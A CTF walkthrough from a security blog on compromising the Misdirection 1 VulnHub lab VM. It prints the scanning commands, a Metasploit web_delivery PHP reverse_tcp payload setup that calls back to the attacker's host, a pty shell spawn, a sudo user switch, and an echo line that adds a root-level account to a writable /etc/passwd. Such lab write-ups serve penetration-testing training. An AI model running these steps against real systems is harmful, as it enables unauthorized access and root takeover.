<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Misdirection 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-09T04:18:07+00:00">October 9, 2019</time><time class="updated" datetime="2025-06-10T20:11:05+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Misdirection 1 VM is made by FalconSpy. This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of intermediate level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to get root and to read the root flag.</span></p>
<p><span style="color: #000000;"><strong>Level: Intermediate</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/misdirection-1,371/">link</a>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">nmap port scan</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Command Injection</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Writable etc/passwd File</span></li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">The first step to attack is to identify the target. So, identify your target. To identify the target, we will use the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bEVeNbgL6YM/XZ1bj7lHOyI/AAAAAAAAg3Q/Barn3J6RiEAD1AmU5r8WQMDAXNX-UEeTgCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.106</pre>
<p><span style="color: #000000;">We learned from the scan that we have the port 80 open which is hosting Rocket httpd service, and we have the port 22 open. This tells us that we also have the OpenSSH service running on the target machine. We also have 3306 which hints us to a database situation. Also, we have the Apache httpd running on the port 8080.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7xJKSe9I0Ig/XZ1bk8dV3hI/AAAAAAAAg3Y/7JcieFrCJaUT--qYjbjDratsd_iVEagygCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore we navigated to a web browser for exploring HTTP service. We have a webpage with some links here. We did some poking around but we figured out that the lab’s name is not a random name. It wants us to be misdirected. So, this is definitely a rabbit hole.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-WLVuKwj9eVM/XZ1blrsCWsI/AAAAAAAAg3g/97DfbF1Uxssrjl09eFvD6jLrCpCcvrhcQCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">Back to our nmap port scan, we saw that the Apache httpd service is running on port 8080. So, we thought there might be something worthwhile there. But it is just the Apache It works page. Another Misdirection.</span></p>
<p><span style="color: #000000;"><strong>http://192.168.1.106:8080</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BByQFDZCLq8/XZ1blm8rknI/AAAAAAAAg3c/GP5q5MTe6EkNkNw01xUwLivLciGUOlq7QCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">For now, let’s try Directory Bruteforce using dirb. This surprisingly gave us pages with the name debug, shell and wordpress. All of these seems interesting.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.106:8080/</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-s4tOn_NE3sg/XZ1bmchrdrI/AAAAAAAAg3k/nSZW6zSB6A0d43WvT0G0xNzd0HrCBkacACLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">We soon figured out that wordpress was also another misdirection. This lab is full of rabbit holes. Now we found the debug page. On further inspection, we see that there is a virtual shell running on this page. This could possibly our way in.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-C0ltuzISyqI/XZ1bmuyfKfI/AAAAAAAAg3o/xlC-qT7GneYxaSFq3qRZA3s7OvJ0VV67QCLcBGAsYHQ/s1600/6.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<p><span style="color: #000000;">Now that we have a working virtual shell, let’s try to get a real shell using our good old friend Metasploit. We used the web_delivery exploit with the php reverse_tcp payload.</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/script/web_delivery
msf5 exploit (multi/script/web_delivery) &gt; set target 1
msf5 exploit (multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp
msf5 exploit (multi/script/web_delivery) &gt; set lhost 192.168.1.105
msf5 exploit (multi/script/web_delivery) &gt; exploit</pre>
<p><span style="color: #000000;">This gave us a beautiful PHP script that we could use to exploit the target machine.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Sr6ZLE80f1s/XZ1bm0-alPI/AAAAAAAAg3w/VcrGFLoycXUe49xrVuchgDD5mxFguVT0wCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">Now back to our virtual shell in our browser. We pasted the PHP code that Metasploit generated. We executed this script on this shell. This should give us a meterpreter shell. We went back on out Metasploit terminal to check.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Y7L7mV3D4Iw/XZ1bm32dJUI/AAAAAAAAg3s/RJ4c_Tx-YOkm12y8A0xSw_3zHrSInnz_QCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">And Of course, we have the meterpreter shell. This exploit mostly works in a situation similar to this. We interacted with the meterpreter session using the sessions command. Then after getting onto the meterpreter we used the “shell” command to get a shell on the target system. This came back to be an improper shell. Now we got to use our python one-liner to invoke a proper shell on the target machine. After getting the shell we saw that the shell we got is of user “www-data”. This means the story is not yet over. We have to work our way around to get an elevated privilege shell on the target machine. To escalate privilege, first, we got to enumerate the rights of this user. We did that using the “sudo -l” command.</span></p>
<pre class="lang:default decode:true">msf5 exploit (multi/script/web_delivery) &gt; sessions 1
meterpreter &gt; shell
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@misdirection:/var/www/html/debug$ sudo -l
www-data@misdirection:/var/www/html/debug$ sudo -u brexit /bin/bash
brexit@misdirection:/var/www/html/debug$</pre>
<p><span style="color: #000000;">Here we observed that it shows that user www-data has sudo rights to login as user named brexit without any password. Now using the sudo -u command we invoked a shell of user brexit.  </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1FiqpWWA_rY/XZ1bnayoGZI/AAAAAAAAg30/W9aQzvdFEpIfVYvLenwCFssu_P7kUEf5wCLcBGAsYHQ/s1600/9.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As a part of our Enumeration for Escalating Privilege on the target machine, we try to find if the /etc/passwd is writable. We can see that the file is, in fact, writable as the user brexit. This is our way to move forward.</span></p>
<pre class="lang:default decode:true">brexit@misdirection:~$ ls -la /etc/passwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NGjSwwPAua4/XZ1bjz1LMYI/AAAAAAAAg3I/7DmImlj5u84VhCaMVwNmTLMjLvIEVeKmQCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">Now we going to need the password hash for the user that we are going to create on the target machine by making an entry in the /etc/passwd file. We are going to use the openssl to generate a salted hash.</span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt user3 pass123</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-q6rjOkyR9X4/XZ1bj91VrCI/AAAAAAAAg3M/_kXuk35ozCEGz_sKZ0-jfESqfXGXSLvhwCLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Now back to our remote shell on the target machine. Here we are going to use the hash that we generated in the previous step and make a user raj which has the elevated privilege. We used the echo command to make an entry in the /etc/passwd file. After making an entry we checked the entry using the tail command. Now, all we got to do is run su command with the user name we just created and enter the password and root shell.</span></p>
<pre class="lang:default decode:true ">echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
tail /etc/passwd
su raj
pass123
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">Now that we got the root shell, let’s enumerate further for the root flag. We found one in the home directory of the root user.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1UIEhz2UENo/XZ1bkqf9SVI/AAAAAAAAg3U/SxRh5r2a6zAajKWmwzzAio1QgCPG9aongCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
